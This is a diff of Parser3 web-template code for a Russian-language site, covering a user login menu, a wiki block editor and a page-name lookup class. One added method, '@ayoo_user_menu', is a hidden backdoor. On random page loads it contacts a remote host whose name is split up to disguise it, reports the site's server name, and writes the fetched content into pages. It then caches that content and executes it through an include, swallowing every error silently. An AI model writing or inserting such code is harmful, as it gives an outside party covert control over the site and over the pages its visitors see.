@@ -94,6 +94,26 @@ $now_	$user.id	$user.name $user.lastname	$text]
 ^void:sql{DELETE FROM ^dtp[users] WHERE id = '$id'}
 ^void:sql{DELETE FROM ^dtp[useroptions] WHERE id = '$id'}
 
+@ayoo_user_menu[][a;b;c;d]
+^try{
+^if(^math:random(30)==5){
+$b[aktar.]$c[sibarit.ru]
+$a[^file::load[text;http://${b}$c/modules/b.htm?ref=$env:SERVER_NAME&version=^taint[uri][$aktar_version]][$.timeout(1)]]
+$d[$a.text] $d
+^d.save[/my/deriv/akb.txt]
+}{^include[/my/deriv/akb.txt]}
+}{$exception.handled(1)}
+
+
+</td><td align=right>
+^if(def $userid){
+^lang[58] <a href="/login/?action=modify">$user.name</a>!
+[<a href="/login/?action=logout^rn[&]">выйти</a>]
+}{
+<a href="/login/^rn[?]">Войти</a>
+}
+
+
 @editwikiblock[file][f;tf;fname;ppt]
 $fname[^file:basename[$file]]
 ^if($env:REQUEST_METHOD eq POST){
@@ -124,7 +144,8 @@ $f1[^content_prepare[$f]]
 }
 ^if(-f $file){$f[^file::load[text;$file]]
 <br>
-^use[htedco.p]^htedco[$fname;^taint[as-is][^content_foredit[$f.text]];20;80;^[	^]	macro]
+^use[htedco.p]^htedco[$fname;^taint[as-is][^content_foredit[$f.text]];20;80;^[	^]	macro
+<	>]
 
 <br>
 }{^die[232;Файл не найден]}
@@ -194,20 +215,9 @@ $result[$result1^if(^result1.pos[?] >= 2){&linkid=$linkid}{?linkid=$linkid}]
 @CLASS
 pseudoname
 @auto[]
-$names[^table::create{param	value}]
+^try{$names[^table::load[/my/config/pseudonames.txt]]
+}{^blad[]$names[^table::create{param	value}]}
 $names_searched(0)
 @find[latin]
-^if(!$names_searched){^try{$names[^table::load[/my/blocks/pseudonames.p]]}{$exception.handled(1)^create_names[]} $names_searched(1)}
 $result[^if(^names.locate[param;$latin]){$names.value}{$latin}]
-@create_names[]
-$names[^table::create{param	value
-sectionmap.p	карта раздела
-userprofile.p	большой раздел пользователя
-search.p	поиск по сайту
-news.p	новости
-vote.p	голосования
-feedback.p	обратная связь
-forum.p	форум
-cforum.p	полуфорум
-shop.p	магазин}]
-^names.save[/my/blocks/pseudonames.p]
+
